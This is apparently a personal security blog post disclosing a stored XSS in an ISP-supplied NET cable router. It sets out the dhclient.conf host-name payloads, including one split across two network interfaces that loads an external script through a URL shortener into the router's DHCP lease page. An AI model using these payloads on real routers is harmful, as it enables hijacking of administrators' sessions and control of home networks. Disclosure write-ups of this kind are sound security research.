---
layout: post
title: Hacking into NET router for fun and profit [FULL DISCLOSURE] 
description: Again, another vulnerability on net router, but this time it's much more fun. 
keywords: router, disclosure, xss, G4mbl3r
disqus: true
tags: [XSS]
categories: Persistence
---
#### Hacking into NET router for fun and profit [FULL DISCLOSURE] 
Recently I moved to another city to live alone, and as needed I contract the only ISP available on my building, NET, one of the worst ISP on Brazil, they just decided to block all my output connections on port 22/ssh, but it's another history.

I have an history pwning [NET router](https://www.exploit-db.com/exploits/42284/), and as I was bored today and decided to play around with my brand new net router.

The first thing I tried on that was an command injection on ping function. It didn't work, but gave the output of what a sent, so I realized that was a lot of XSS possibilities on this router. The first place I tried, was on ping function again, but there was some control that did not allow me to sent especial characters, beyond that, it's not a good place to get a XSS, I needed a XSS stored on this precious router, and then a divine light open my mind, and made me test the first page of the router, where they show the DHCP leases. This page contains host name, ip address and mac address of each host so I thought maybe I could manipulate the host name of my host and sent a malicious data. In a simple Google search, I realized that I just need to change one line on dhclient config file (/etc/dhcp/dhclient.conf)

```bash
send host-name = "<script>alert('HACKED')</script>";
```

Sadly it didn't work. I opened the html source and saw that the last character wasn't there so I figured out that there was a limit on the host name size only 31 characters. Just to validate the XSS, I removed the HACKED string to force the lease and it works and then my saga started to get something more interesting then a alert().

I created a payload.js and hosted it on a VPS and tried a lot of techniques to make the content of this file executed by the browser, but none of then worked. I got close using the site [l.ly](https://l.ly) to short my url, but due the "XXX" character, it didn't work.

```bash
send host-name = "<script src=//l.ly/uXa></script>";
```

So I thought in buying a short domain like l.ly and host my payload file named as 1 and my problem would be resolved, but it's extremely expensive and I don't have money to do that. After hours thinking the best way to do that, I realized how stupid I am: the only thing I needed, is just another network interface, to create this output on the router.

```html
<tr><td>10</td><td><script src=//l.ly/uXa><!--</td><td>f4:96:34:25:65:c5</td><td>192.168.0.44</td></tr>
<tr><td>10</td><td>--></script></td><td>f4:96:34:25:65:c5</td><td>192.168.0.44</td></tr>
```

I just splitted the payload on my 2 interfaces, the first interface receives the follow payload,

```bash
send host-name = "<script src=//l.ly/uXa><!--";
```

Where I have the start of the payload, and a HTML comment, to ignore everything after my tag script, and the second payload,

```bash
send host-name = "--></script>";
```
I just closed the comment, and inserted the end of the tag script, I forced the interfaces to lease the ip address and request again, and then I finally got my XSS payload been executed.

```bash
dhclient -r && dhclient
```

![hacked](/assets/images/router-hacked.png "hacked")

#### About the router
Below is information about the router

|Description        | Version      	|
|-------------------| -------------:|
|Technology 		| docsis 3.0	|
|Hardware Version 	| V2.00			|
|Software Version 	| 09.89.17.23.03|

